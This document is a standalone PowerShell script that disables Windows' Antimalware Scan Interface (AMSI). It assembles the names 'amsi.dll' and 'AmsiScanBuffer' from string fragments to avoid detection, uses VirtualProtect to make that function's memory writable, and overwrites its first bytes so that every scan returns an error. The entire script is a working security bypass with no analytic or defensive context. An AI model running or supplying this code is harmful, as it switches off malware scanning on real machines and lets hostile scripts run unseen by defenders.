$MethodDefinition = @'
[DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32.dll", CharSet=CharSet.Auto)]
public static extern IntPtr GetModuleHandle(string lpModuleName);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@

$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -Namespace 'Win32' -PassThru

$ASBD = "Ams"
$E = "i"
$F = "Sca"
$H = "nBuff"
$T = "er"
$result = $ASBD + $E + $F + $H + $T
$module = "ams{0}" -f "i.dll" 

$handle = [Win32.Kernel32]::GetModuleHandle($module)

if ($handle -eq [IntPtr]::Zero) {
    Write-Error "Failed to get module handle for $module"
    exit
}

[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $result)

if ($BufferAddress -eq [IntPtr]::Zero) {
    Write-Error "Failed to get the address of $result"
    exit
}

[UInt32]$Size = 0x5
[UInt32]$ProtectFlag = 0x40
[UInt32]$OldProtectFlag = 0

$success = [Win32.Kernel32]::VirtualProtect($BufferAddress, [UIntPtr]$Size, $ProtectFlag, [Ref]$OldProtectFlag)

if (-not $success) {
    Write-Error "Failed to change memory protection"
    exit
}

$buf = New-Object byte[] 6
$buf[0] = 0xB8
$buf[1] = 0x57
$buf[2] = 0x00
$buf[3] = 0x07
$buf[4] = 0x80
$buf[5] = 0xC3

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $BufferAddress, $buf.Length)

Write-Host "Successfully patched $result"
